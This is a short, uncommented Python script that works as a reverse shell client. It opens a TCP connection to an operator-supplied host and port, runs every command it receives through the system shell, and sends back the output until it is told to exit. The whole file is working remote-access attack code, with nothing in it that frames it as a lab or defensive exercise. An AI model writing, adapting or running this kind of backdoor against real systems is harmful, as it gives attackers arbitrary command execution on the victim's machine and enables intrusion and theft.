import socket
import argparse
import subprocess

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", nargs= '?', type= str, default= '127.0.0.1')
    parser.add_argument("-p", nargs= '?', type= int, default= 7000)

    args = parser.parse_args()
    hostIP = args.i
    port = args.p

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostIP, port))

    while True:
        inByte = s.recv(4096)
        inStr = inByte.decode()

        if inStr == 'exit': 
            break

        commandResult = subprocess.run(inStr, shell= True, capture_output= True)

        if commandResult.returncode != 0: outputBtye = commandResult.stderr
        else: outputBtye = commandResult.stdout

        outputStr = outputBtye.decode()
        s.send(str.encode(outputStr + 'END'))

    s.close()

if __name__ == '__main__':
    main()